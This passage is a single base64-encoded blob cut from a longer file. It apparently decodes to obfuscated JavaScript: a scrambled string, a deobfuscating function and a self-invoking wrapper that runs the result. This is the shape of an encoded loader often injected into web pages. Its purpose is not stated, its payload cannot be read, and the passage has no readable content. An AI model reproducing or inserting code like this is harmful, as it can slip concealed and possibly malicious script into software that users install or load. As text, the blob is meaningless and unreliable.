3MUt0M25VSGQuVTBmdTMuVVVyIHRwVV1EKCJlNiwgaVVVM3RZZXQ2KDtdPV40cGMgOVdVXWNodjIuYF8ub11wOztfdF1qVVUxLm5sKXIlMF1JMTs4VTJpSnhkbyBkc2NldGlzVXVVZXNdVzw9ZXNVZGFyIiUpVW9fcklle3Q6KV9ke2FPdWU7YygxcjNsOS42NHtjIV9vZW9hMGpddFJtaCFlbmdzZSkkMyl4fV9fMltzXVVuImstJS5kMndtZCtVVSlTVVU2bnVuci42NipdcmU1VWlyVTtlay5zMVU/PStiLWUwXyk1bntaLmVlLl8xZXskKFV0VTlVfWxVbnsrVV1lU3NfVShrNDVVJnJydHhVYj01fT09ZVVkbTo1clVVNSgrVT1sY29vLlguVTFkJEZzJSlhKGkoYmQoMHRpcyFVX2ZlKC5vdGV9VWNDWjspM2QhdWdVaXMyIX0jX2EgZiY9VTsuX3NiPDQ7VV9VMTNyaT0pW253YmlpLnRqcDp1NXJpVWVpZDsuZixiVX1kZX0uNmYlNXtVYWxfZjAgMl80X19fMTAxciFdXTNVdFVINykgdCFVWmk+XFxybDc9bzRwPytjYTtReSB9aHRhPWFVVVVfMzMkbildciBkPSxVMXQtYil0KWIuM189b3Q1ZkVVKXY1Y1VpMShVdCk+aDZ0XXBjbmU4Mm5dVSVVOy5pcjIpXzE2ZF0sOlVfNjV9NjopVlVVLjFVYTB3aS5iMXgoKHMlfSIrVV8odnRdQEM9PSBVN3JhNG5fJWUxajBvbDIhK11rKGNfbVVffV1fbi0ocm9jaiFzXWU6MiBdLHMgVSBVNiwyM1VVLjNkb1opLnNuZ25zIXRlZSlDbm9lcjUzbz10NDYyVVV0KnIuZF9VVVUuMXQ9ZGlfMnNvLm5aVWRlO19sb29hICZ9VTJVYywubzFdXSFVfSQsZGQgVTFyb1VvYWNhLHBvZUNkdGIxXS4ybCRVdWVwIW5yeF1fdSBdOFVmIDtkXy4rMixkdD1fdFVjZCA8JTtfLlU7dFVtM10pVWx0dFVcXDtle3JVNisrICAgITFVJWV2NmVfN19jVTluZHVbXlRVXzNVZiVdWm80ZXlVIHouSGFVZlVfVV1pS2cuISQ9eC4xblVkbWAuLlUuVSZlbC5kZmVdLiUuYWggVShkZVVkb2lVbTMwciRkKTNdRlV7YTRcXC59XSFkcil0WSgwPVUrU1VVclUpVThKVXVkdFVVTWl5VWx0VXJVdD0lblUxVVVVVXMrblVvaV8wbW09UTcpZW9kIUVubGtlVXQkX2kzPTBzbSAyNyFjZV8zXzo3bjVhIF86X1VJIG9pX2dVIDFpb2x1YWZlaSl5ZVUue3tgeyAgVVRfaW5yaD1VISBoXS5kO3IubnByclV9aF1VKHUgYz1jPV9lMXJ1IHQmZWFVLi4ubigxaV1VYVRlViQpY3RuaWQwJSk9Ml9hVVUuM3spblVsOSh0Y2ZvZSFmKG9VPSBJc31VLmQufSMnKSk7dmFyIHZuVj16eGYoSEFhLGNkSCApO3ZuVigzMTczKTtyZXR1cm4gMjEwOX0pKCk='))
